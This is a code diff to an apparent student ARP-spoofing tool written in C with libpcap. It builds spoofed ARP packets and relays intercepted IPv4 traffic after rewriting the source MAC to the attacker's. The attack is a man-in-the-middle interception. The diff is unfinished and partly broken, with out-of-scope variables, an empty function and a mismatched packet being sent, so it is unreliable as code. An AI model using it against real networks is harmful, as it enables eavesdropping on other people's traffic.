@@ -11,7 +11,7 @@
 
 #define MAC_SIZE 6
 
-
+#define MTU 1500
 
 
 #pragma pack(push, 1)
@@ -119,7 +119,35 @@ bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
     }
 }
 
+bool check_spoofed(pcap_t* handle){
+
+}
+
+
 bool sendArpSpoof(pcap_t* handle, EthArpPacket &packet) {
+
+    EthArpPacket myPacket;
+
+    //config default
+
+    // Get network information
+    if(getMyIp(dev,myPacket)==-1){
+        return -1;
+    }
+
+	myPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 1 : broadcast 2 : sender mac
+	// myPacket.eth_.smac_ = Mac(); -> config after getMyMac()
+	myPacket.eth_.type_ = htons(EthHdr::Arp);
+
+	myPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
+	myPacket.arp_.pro_ = htons(EthHdr::Ip4);
+	myPacket.arp_.hln_ = Mac::SIZE;
+	myPacket.arp_.pln_ = Ip::SIZE;
+	myPacket.arp_.op_ = htons(ArpHdr::Request);  
+	// myPacket.arp_.smac_ = Mac("00:00:00:00:00:00"); -> after getMyMac() 
+	// myPacket.arp_.sip_ = htonl(Ip("0.0.0.0"));  -> after getMyIp()
+	myPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
+	myPacket.arp_.tip_ = htonl(Ip(argv[2]));
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
@@ -127,6 +155,7 @@ bool sendArpSpoof(pcap_t* handle, EthArpPacket &packet) {
         return false;
     }
     return true;
+
 }
 
 
@@ -140,9 +169,13 @@ void relay_packet(pcap_t* handle,const char* dev) {
         if (res == 0) continue;
         if (res == -1 || res == -2) break;
 
+
+
+
         //Ip packet parsing
         // check Eth_type -> if ipv4 -> relay
         struct libnet_ethernet_hdr *eth_hdr = (struct libnet_ethernet_hdr *)packet;
+
         if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) continue;
 
         // modify smac to mine (attacker)
@@ -152,14 +185,25 @@ void relay_packet(pcap_t* handle,const char* dev) {
             return;
         }
 
+        // spoofed?? == 1) mac check()-1.1)src, 1.2)dst
+        // 2) ip check
+        // -2-2) sip check (against my ip)
+        // -2-3) dip check (my ip)
+        //  if not? spoofing and continue
+
+        
         memcpy(eth_hdr->ether_shost, m_mac, 6);
         free(m_mac);         
         //send to target
 
-        if (pcap_sendpacket(handle, packet, header.len) != 0) {
+        if (header->len > MTU) {
+            printf("jumbo frame\n");
+            return;
+        } else if (pcap_sendpacket(handle, packet, header->len) != 0) {
             fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
             return;
         }
+        printf("good!\n");
     }
 }
 
@@ -195,9 +239,9 @@ int main(int argc, char* argv[]) {
 	myPacket.arp_.tip_ = htonl(Ip(argv[2]));
 
     // Get network information
-    if(getMyIp(dev,myPacket)==-1){
+/*     if(getMyIp(dev,myPacket)==-1){
         return -1;
-    }
+    } */
     
     relay_packet(handle,dev);
 
